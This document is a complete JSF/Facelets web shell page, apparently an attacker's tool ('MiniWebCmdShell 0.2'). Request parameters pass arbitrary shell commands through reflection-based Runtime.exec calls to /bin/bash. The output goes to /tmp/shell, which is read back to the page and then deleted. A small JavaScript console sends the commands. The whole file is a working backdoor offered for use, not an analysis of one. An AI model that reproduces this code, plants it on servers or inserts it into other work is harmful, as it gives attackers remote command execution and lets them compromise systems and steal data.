<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
	  xmlns:ui="http://java.sun.com/jsf/facelets"
	  xmlns:h="http://java.sun.com/jsf/html"
	  xmlns:c="http://xmlns.jcp.org/jsp/jstl/core">
	<style type="text/css">
	.wrapper{
		border: 2px solid black;
		background-color: #C0C0C0 ; 
		overflow:hidden;
		margin: auto;
		width: 50%;
				word-wrap: break-word;
	}
	.field{
		margin: 20px;
	}

	.output{
	
	}
	body{
		background-color: #383838;
	}
</style>
	<body>
		
		<c:choose>
			<c:when test="${request.getParameter('do') != null}">
			#{view.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("exec","1,2".split(",").getClass()).invoke(view.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null),("/bin/bash,-c,".concat(request.getParameter("do")).concat(">/tmp/shell")).split(","))}
			</c:when>
	
			<c:when test="${request.getParameter('cmd') !=null}">
								<code>
					<i>${request.getParameter("cmd")}</i>:
					<pre>#{ view.getClass().getClassLoader().loadClass("java.util.Scanner").getMethod("next").invoke(
								view.getClass().getClassLoader().loadClass("java.util.Scanner").getMethod("useDelimiter", "a".getClass()).invoke(
									 view.getClass().getClassLoader().loadClass("java.util.Scanner").getConstructor(view.getClass().getClassLoader().loadClass("java.io.File").getConstructor("a".getClass()).newInstance("/tmp/shell").getClass()).newInstance(
											view.getClass().getClassLoader().loadClass("java.io.File").getConstructor("a".getClass()).newInstance("/tmp/shell")
									 ),"\\Z"
								)
							)}</pre>
				</code>
			</c:when>

			<c:when test="${request.getParameter('clear')!= null}">
			   ${view.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("exec","1".getClass()).invoke(view.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null),"rm /tmp/shell")}
			</c:when>
		</c:choose>
		



	<div class="wrapper">
		<div class="field">
			<center>----------------------------------------------------------</center>
			<div class="output" id="output">
			
			</div>
			<center>----------------------------------------------------------</center>
			<center>
				<form onsubmit="return startMagic()">
					<input autocomplete="off" id='cmd' name='cmd' size='100' placeholder='command' style="text-align:center; "/>
				</form>
			</center>
			<center><font size="1"><i>Java Server Faces MiniWebCmdShell 0.2 by HeartLESS.</i></font></center>
		</div>
	</div>
	</body>
<script type="text/javascript">
	var xmlhttp;
		if (window.XMLHttpRequest){// code for IE7+, Firefox, Chrome, Opera, Safari
			xmlhttp=new XMLHttpRequest();
		} else {// code for IE6, IE5
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}

	 function startMagic(){
			try{
						//execution
							xmlhttp.open("GET",location.pathname+"?do=" + encodeURI(document.getElementById("cmd").value),false);
							xmlhttp.send();
							console.log(xmlhttp.responseText);
						//reading
							xmlhttp.open("GET",location.pathname+"?cmd=" + encodeURI(document.getElementById("cmd").value),false);
							xmlhttp.send();
							a = xmlhttp.responseText.indexOf('<code>');
							b = xmlhttp.responseText.indexOf('</code>');
							document.getElementById('output').innerHTML = xmlhttp.responseText.substr(a+6,b-a -6);
						//cleaning
							xmlhttp.open("GET",location.pathname+"?clear",true);
							xmlhttp.send();
						}catch(e){
							console.log(e);
						}
			return false;
		}


</script>
	
</html>